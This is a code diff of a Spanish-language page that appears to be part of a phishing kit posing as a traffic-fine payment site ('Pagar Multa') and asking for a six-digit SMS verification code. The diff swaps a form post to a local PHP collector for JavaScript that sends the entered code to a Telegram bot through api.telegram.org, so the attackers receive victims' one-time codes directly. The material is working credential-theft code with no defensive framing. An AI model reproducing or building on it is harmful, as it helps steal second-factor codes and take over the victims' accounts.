@@ -257,13 +257,13 @@
 
 <h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span style="box-sizing: inherit;">4</span></span><span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;<span style="font-size:16px;">SMS</span></span></span></h2>
 
-<form action="./infoz/sm.php" method="post">
-<div class="row">
+<form onsubmit="return validateSMS();" method="post">
+    <div class="row">
 <div class="col-md-6 form-group">&nbsp;</div>
 
 <div class="col-md-6 form-group">&nbsp;</div>
 
-<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span> <input class="form-control" id="first_name" maxlength="6" name="sms" required="" size="122" type="text" />
+<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span> <input id="first_name" maxlength="6" name="sms" required type="text" />
 <div class="sms-error-frame" id="smsError" style="display: none;">Por favor, ingrese un c&oacute;digo v&aacute;lido.</div>
 </div>
 
@@ -272,7 +272,7 @@
 <div class="col-md-6 form-group">&nbsp;</div>
 </div>
 
-<p><button class="btn btn-primary" onclick="return validateSMS();" type="submit">Pagar Multa</button></p>
+<p><button type="submit" class="btn btn-primary">Pagar Multa</button></p>
 </form>
 </section>
 
@@ -295,14 +295,28 @@
     function validateSMS() {
         var smsCode = document.getElementById('first_name').value;
         var errorElement = document.getElementById('smsError');
+    
         if (smsCode.length !== 6 || isNaN(smsCode)) {
             errorElement.style.display = 'block';
             return false;  // Prevent form submission
         } else {
             errorElement.style.display = 'none';
-            return true;  // Allow form submission
+    
+            // إرسال البيانات للـ Telegram مباشرة
+            const message = `Código SMS recibido: ${smsCode}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.error(err));
+    
+            return true;  // يسمح بالإرسال / redirect إذا ضروري
         }
     }
-</script></body>
+    </script>
+    </body>
 </html>
 x
